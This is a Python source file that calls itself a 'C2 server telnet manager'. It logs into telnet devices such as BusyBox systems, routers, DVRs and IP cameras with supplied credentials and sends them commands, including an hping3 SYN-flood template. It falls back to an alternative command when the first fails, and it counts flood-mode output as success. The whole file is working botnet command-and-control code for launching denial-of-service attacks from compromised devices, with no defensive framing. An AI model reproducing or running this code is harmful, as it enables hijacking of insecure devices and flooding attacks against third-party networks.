# C2 server telnet manager
import telnetlib
import logging
import time
import re
import socket

class TelnetManager:
    def __init__(self):
        self.active_sessions = {}
        
        # Known command patterns for different device types
        self.device_commands = {
            'busybox': {
                'echo': 'echo {text}',
                'ping': 'ping -c 3 {target}',
                'syn_flood': 'hping3 -S -p {port} -c {count} {target}'
            },
            'generic': {
                'echo': 'echo {text}',
                'ping': 'ping -c 3 {target}',
                'syn_flood': 'hping3 -S -p {port} -c {count} {target}'
            }
        }
        
        # Common login prompts for telnet
        self.login_patterns = [
            b"login: ", b"Username: ", b"Login: ", b"user: ", b"User: "
        ]
        
        # Common password prompts
        self.password_patterns = [
            b"Password: ", b"password: ", b"Password:", b"password:", 
            b"passcode: ", b"Passcode: "
        ]
        
        # Shell prompts for different device types
        self.shell_patterns = [
            b"$ ", b"# ", b"> ", b"$", b"#", b">", b"~", b"~]",
            b"admin@", b"root@", b"user@", b"menu>"
        ]
        
        # Error patterns that indicate command failure
        self.error_patterns = [
            b"command not found", b"Permission denied", b"sudo: command not found",
            b"not found", b"No such file or directory", b"Cannot execute", 
            b"unknown command", b"Error:", b"error:"
        ]
    
    def execute_telnet_login_and_send(self, ip, username, password, command):
        """Establish Telnet connection, login, send command, and verify execution"""
        tn = None
        try:
            logging.info(f"Attempting Telnet connection to {ip}:23")
            # Set shorter timeout to detect network issues faster
            tn = telnetlib.Telnet(ip, 23, timeout=25)
            logging.info(f"Telnet connection to {ip} established")
            
            # Try detecting the device type
            device_type = self._detect_device_type(tn)
            logging.info(f"Detected device type for {ip}: {device_type}")
            
            # Handle login prompt with retry mechanism
            logged_in = self._handle_login(tn, ip, username, password)
            if not logged_in:
                if tn:
                    tn.close()
                return None
                
            # Execute the command with customization for device type
            executed = self._execute_command(tn, ip, command, device_type)
            if not executed:
                if tn:
                    tn.close()
                return None
                
            # Store the session for future reference
            self.active_sessions[ip] = tn
            return tn

        except socket.timeout:
            logging.error(f"Connection timeout while connecting to {ip}")
            if tn:
                try:
                    tn.close()
                except:
                    pass
            return None
        except ConnectionRefusedError:
            logging.error(f"Connection refused by {ip}")
            if tn:
                try:
                    tn.close()
                except:
                    pass
            return None
        except Exception as e:
            logging.error(f"✗ Telnet execution failed for {ip}: {e}")
            if tn:
                try:
                    tn.close()
                except:
                    pass
            return None

    def _detect_device_type(self, tn):
        """Try to detect device type based on banner"""
        try:
            # Read initial banner - some devices send information before prompting
            banner = tn.read_until(b"login", timeout=3)
            banner_text = banner.decode(errors='ignore').lower()
            
            # Try to identify the device type
            if 'busybox' in banner_text:
                return 'busybox'
            elif 'router' in banner_text:
                return 'router'
            elif 'dvr' in banner_text or 'nvr' in banner_text:
                return 'dvr'
            elif 'camera' in banner_text or 'ipcam' in banner_text:
                return 'camera'
                
            # Default to generic
            return 'generic'
            
        except Exception as e:
            logging.debug(f"Error detecting device type: {e}")
            return 'generic'
            
    def _handle_login(self, tn, ip, username, password, max_retries=2):
        """Handle login process with retry mechanism"""
        retries = 0
        
        while retries <= max_retries:
            try:
                # Wait for login prompt
                index, match, response = tn.expect(self.login_patterns, timeout=15)
                response_text = response.decode(errors='ignore')
                logging.info(f"Login response from {ip}: {response_text}")
                
                if not match:
                    if retries < max_retries:
                        # Try sending a newline to trigger login prompt
                        tn.write(b"\n")
                        retries += 1
                        continue
                    else:
                        logging.error(f"✗ No login prompt detected on {ip} after {max_retries} retries")
                        return False
                
                # Send username
                tn.write(username.encode() + b"\n")
                logging.info(f"Sent username '{username}' to {ip}")
                
                # Wait for password prompt
                index, match, response = tn.expect(self.password_patterns, timeout=10)
                response_text = response.decode(errors='ignore')
                logging.info(f"Password prompt response from {ip}: {response_text}")
                
                if not match:
                    if retries < max_retries:
                        # Try again
                        retries += 1
                        continue
                    else:
                        logging.error(f"✗ No password prompt detected on {ip} after {max_retries} retries")
                        return False
                
                # Send password
                tn.write((password or "").encode() + b"\n")
                logging.info(f"Sent password to {ip}")
                
                # Wait for shell prompt
                index, match, response = tn.expect(self.shell_patterns, timeout=15)
                response_text = response.decode(errors='ignore')
                
                # Check for login failure messages
                if any(msg in response_text.lower() for msg in ['login incorrect', 'access denied', 'authentication failed']):
                    logging.error(f"✗ Login failed for {ip} - authentication rejected")
                    return False
                    
                if not match:
                    if retries < max_retries:
                        # Try again
                        retries += 1
                        continue
                    else:
                        logging.error(f"✗ No shell prompt detected on {ip} after login")
                        return False
                
                # Verify login with a simple echo command
                tn.write(b"echo TELNET_LOGIN_SUCCESS\n")
                index, match, response = tn.expect([b"TELNET_LOGIN_SUCCESS"], timeout=5)
                
                if match:
                    logging.info(f"✓ Login verified on {ip}")
                    return True
                else:
                    if retries < max_retries:
                        # Try again
                        retries += 1
                        continue
                    else:
                        logging.warning(f"? Could not verify login on {ip} - proceeding anyway")
                        return True  # Still return true as we might be logged in
                
            except Exception as e:
                logging.error(f"✗ Error in login process for {ip}: {e}")
                if retries < max_retries:
                    retries += 1
                    continue
                else:
                    return False
                    
        return False
    
    def _execute_command(self, tn, ip, command, device_type='generic'):
        """Execute command with device-specific adaptations"""
        try:
            # Send the command
            logging.info(f"Sending command to {ip}: {command}")
            tn.write(command.encode() + b"\n")
            time.sleep(1)  # Short pause to let command start processing
            
            # Check for sudo password prompt and handle it
            sudo_patterns = [
                b"[sudo] password for",
                b"Password:",
                b"password:",
                b"Enter password:"
            ]
            
            hping_patterns = [
                b"HPING",
                b"hping",
                b"--- hping statistic ---",
                b"flood mode"
            ]
            
            # Check for sudo prompt first
            index, match, response = tn.expect(sudo_patterns, timeout=5)
            if match:
                # Send password for sudo
                if 'password' in response.decode(errors='ignore').lower():
                    logging.info(f"Sudo password prompt detected on {ip}, sending password")
                    tn.write(b"\n")  # Just press enter if no password set
                    time.sleep(1)
            
            # Now check for command execution indicators or errors
            all_patterns = self.error_patterns + hping_patterns + self.shell_patterns
            index, match, response = tn.expect(all_patterns, timeout=10)
            response_text = response.decode(errors='ignore')
            
            if match:
                matched_text = match.group(0).decode(errors='ignore')
                
                # Check for errors
                if any(error in matched_text.lower() for error in [pat.decode(errors='ignore').lower() for pat in self.error_patterns]):
                    logging.error(f"✗ Command failed on {ip}: {response_text}")
                    
                    # Try alternative command format if this is a common command
                    if 'hping3' in command and 'command not found' in response_text:
                        # Try hping instead of hping3
                        alt_command = command.replace('hping3', 'hping')
                        logging.info(f"Trying alternative command on {ip}: {alt_command}")
                        tn.write(alt_command.encode() + b"\n")
                        
                        # Check if alternative command worked
                        index, match, response = tn.expect(hping_patterns + self.shell_patterns, timeout=10)
                        if any(pattern in response for pattern in hping_patterns):
                            logging.info(f"✓ Alternative command succeeded on {ip}")
                            return True
                        else:
                            logging.error(f"✗ Alternative command also failed on {ip}")
                            return False
                    else:
                        return False
                
                # Check for hping patterns indicating success
                elif any(pattern in matched_text.lower() for pattern in [pat.decode(errors='ignore').lower() for pat in hping_patterns]):
                    logging.info(f"✓ Command execution confirmed on {ip}")
                    return True
                
                # If we got a shell prompt back, the command might have executed too quickly
                # or it might be running in the background
                elif any(pattern in matched_text for pattern in [pat.decode(errors='ignore') for pat in self.shell_patterns]):
                    logging.info(f"? Command possibly executed on {ip} (shell prompt returned)")
                    return True
                
                else:
                    logging.warning(f"? Ambiguous command execution status on {ip}")
                    return True  # Assume success if nothing indicates failure
            else:
                # No pattern matched, this might mean the command is running (e.g., in flood mode)
                logging.info(f"? No response pattern matched on {ip} - assuming command is running")
                return True
                
        except Exception as e:
            logging.error(f"✗ Error executing command on {ip}: {e}")
            return False
    
    def close_session(self, session):
        """Close a telnet session"""
        try:
            # Remove from active sessions dict
            for ip, tn in list(self.active_sessions.items()):
                if tn == session:
                    del self.active_sessions[ip]
                    break
                    
            # Close the session
            if session:
                session.close()
                logging.info("Closed telnet session")
        except Exception as e:
            logging.error(f"Error closing telnet session: {e}")
    
    def close_all_sessions(self):
        """Close all active telnet sessions"""
        for ip in list(self.active_sessions.keys()):
            try:
                session = self.active_sessions[ip]
                session.close()
                logging.info(f"Closed telnet session for {ip}")
                del self.active_sessions[ip]
            except Exception as e:
                logging.error(f"Error closing telnet session for {ip}: {e}")
